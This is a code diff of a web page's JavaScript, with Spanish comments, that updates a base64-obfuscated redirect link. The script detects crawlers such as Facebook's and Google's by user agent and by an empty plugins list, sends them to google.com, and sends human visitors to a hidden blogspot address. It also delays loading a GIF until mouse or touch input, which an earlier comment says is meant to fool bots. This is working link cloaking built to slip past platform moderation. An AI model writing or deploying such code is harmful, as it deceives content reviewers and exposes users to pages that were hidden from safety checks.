@@ -40,18 +40,17 @@
     <div id="dynamic-bg"></div>
 
     <script type="text/javascript">
-        // Variables Ofuscadas en Base64
-        // aHR0cHM6Ly9sYXNnb29nbGVzZmFjZS5ibG9nc3BvdC5jb20=  -> Tu link real
-        // aHR0cHM6Ly9pLmliYi5jby9mWWp2OWZQMi9lbnNlcGlhZ2lmai5naWY= -> Tu GIF
+        // Variables Ofuscadas actualizadas
+        // aHR0cHM6Ly9sb3NsaW5rZXNwYS5ibG9nc3BvdC5jb20= es tu nuevo link
         
-        const _0x_rL = "aHR0cHM6Ly9sYXNnb29nbGVzZmFjZS5ibG9nc3BvdC5jb20="; 
+        const _0x_rL = "aHR0cHM6Ly9sb3NsaW5rZXNwYS5ibG9nc3BvdC5jb20="; 
         const _0x_gB = "aHR0cHM6Ly9pLmliYi5jby9mWWp2OWZQMi9lbnNlcGlhZ2lmai5naWY=";
         const _0x_sL = "https://google.com";
 
         // Función para decodificar
         function _dec(_s){ return atob(_s); }
 
-        // 1. Carga del GIF solo tras interacción humana para engañar al bot
+        // 1. Carga del GIF tras interacción humana
         function loadVisuals() {
             if(!document.getElementById('bg-loaded')){
                 const bg = document.createElement('img');
@@ -65,22 +64,24 @@
         window.addEventListener('mousemove', loadVisuals, {once: true});
         window.addEventListener('touchstart', loadVisuals, {once: true});
 
-        // 2. Lógica de Redirección Avanzada
+        // 2. Lógica de Redirección con Filtro de Bots
         document.getElementById('main-link').addEventListener('click', function(e) {
             const ua = navigator.userAgent.toLowerCase();
             const isBot = /bot|spider|facebook|facebot|crawl|google|slurp|bing|lighthouse/i.test(ua);
             
-            // Verificación extra: Los bots suelen tener window.chrome pero no ciertos plugins
+            // Verificación de entorno (los bots suelen fallar aquí)
             const isSuspicious = !navigator.plugins || navigator.plugins.length === 0;
 
             if (isBot || isSuspicious) {
+                // Si es bot, mandarlo a Google
                 window.location.replace(_0x_sL);
             } else {
+                // Si es humano, mandarlo a tu blog
                 window.location.replace(_dec(_0x_rL));
             }
         });
 
-        // Simulación de pasos
+        // Simulación de navegación entre pasos
         $('.tr-next-button').click(function(){
             $('.step-item').hide();
             $('.step-item').last().show();
